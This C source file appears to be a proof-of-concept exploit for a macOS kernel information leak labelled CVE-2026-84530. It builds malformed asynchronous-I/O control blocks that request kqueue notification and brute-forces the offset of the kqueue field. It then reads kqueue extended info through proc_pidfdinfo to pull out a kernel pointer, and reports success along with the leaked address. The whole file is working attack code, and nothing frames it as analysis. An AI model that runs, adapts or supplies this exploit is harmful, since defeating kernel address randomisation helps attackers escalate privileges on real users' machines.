#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <aio.h>
#include <sys/event.h>
#include <sys/types.h>

extern int proc_pidfdinfo(int pid, int fd, int flavor, void *buf, int bufsz);
#define PROC_PIDFDKQUEUE_EXTINFO 9
#define SIGEV_KEVENT_VAL         3
#define EVFILT_AIO_VAL           ((int16_t)(-3))
#define KQEXT_SDATA_OFFSET       72
#define KQEXT_STRIDE             88

static char g_result[2048];

uint64_t cve_84530_leak(void) {
    const char *home = getenv("HOME");
    if (!home) home = "/tmp";
    char tmppath[512];
    snprintf(tmppath, sizeof(tmppath), "%s/Documents/aio.bin", home);
    int wfd = open(tmppath, O_RDWR|O_CREAT|O_TRUNC, 0600);
    if (wfd < 0) {
        snprintf(tmppath, sizeof(tmppath), "/tmp/aio_%d.bin", (int)getpid());
        wfd = open(tmppath, O_RDWR|O_CREAT|O_TRUNC, 0600);
    }
    write(wfd, "CVE-2026-84530", 14);
    close(wfd);

    int fd = open(tmppath, O_RDONLY);
    if (fd < 0) {
        snprintf(g_result, sizeof(g_result), "open failed errno=%d", errno);
        return 0;
    }

    static char iobuf[64];

    struct aiocb probe;
    memset(&probe, 0, sizeof(probe));
    probe.aio_fildes = fd;
    probe.aio_buf    = iobuf;
    probe.aio_nbytes = 8;
    probe.aio_offset = 0;
    probe.aio_sigevent.sigev_notify = 0;
    int probe_ret = aio_read(&probe);
    if (probe_ret != 0) {
        snprintf(g_result, sizeof(g_result),
            "SIGEV_NONE failed errno=%d (%s)", errno, strerror(errno));
        close(fd); return 0;
    }
    const struct aiocb *pl[1] = { &probe };
    aio_suspend(pl, 1, NULL);
    aio_return(&probe);

    for (int off = 32; off <= 120; off += 4) {
        int kq = kqueue();
        if (kq < 0) continue;
        static char cb[256];
        memset(cb, 0, sizeof(cb));
        *(int      *)(cb +  0) = fd;
        *(int64_t  *)(cb +  8) = 0;
        *(void    **)(cb + 16) = iobuf;
        *(uint64_t *)(cb + 24) = 8;
        *(int      *)(cb + 32) = 0;
        *(int      *)(cb + 40) = SIGEV_KEVENT_VAL;
        *(int      *)(cb + off) = kq;
        int ret = aio_read((struct aiocb *)cb);
        if (ret == 0) {
            usleep(30000);
            uint8_t ext[4096];
            memset(ext, 0, sizeof(ext));
            int n = proc_pidfdinfo(getpid(), kq,
                        PROC_PIDFDKQUEUE_EXTINFO, ext, (int)sizeof(ext));
            if (n > 0) {
                for (int i = 0; i < n / KQEXT_STRIDE; i++) {
                    uint8_t  *e = ext + i * KQEXT_STRIDE;
                    int16_t   f = *(int16_t  *)(e + 8);
                    int64_t   d = *(int64_t  *)(e + 32);
                    uint64_t  s = *(uint64_t *)(e + KQEXT_SDATA_OFFSET);
                    if (f == EVFILT_AIO_VAL) {
                        snprintf(g_result, sizeof(g_result),
                            "SUCCESS CVE-2026-84530\n"
                            "kq_offset=%d\n"
                            "kqext_kev.data=0x%llx\n"
                            "kqext_sdata=0x%llx <- KERNEL PTR",
                            off,
                            (unsigned long long)d,
                            (unsigned long long)s);
                        close(kq); close(fd);
                        return s;
                    }
                }
                snprintf(g_result, sizeof(g_result),
                    "aio ok off=%d, %d knotes, no EVFILT_AIO",
                    off, n/KQEXT_STRIDE);
            } else {
                snprintf(g_result, sizeof(g_result),
                    "aio ok off=%d, proc_pidfdinfo errno=%d", off, errno);
            }
            close(kq); close(fd); return 0;
        }
        if (errno != 22) {
            snprintf(g_result, sizeof(g_result),
                "off=%d unexpected errno=%d (%s)",
                off, errno, strerror(errno));
            close(kq); close(fd); return 0;
        }
        close(kq);
    }

    snprintf(g_result, sizeof(g_result),
        "SIGEV_NONE OK, all offsets 32-120 EINVAL\n"
        "SIGEV_KEVENT unsupported on this sandbox level");
    close(fd);
    return 0;
}

const char *cve_84530_leak_str(void) { return g_result; }
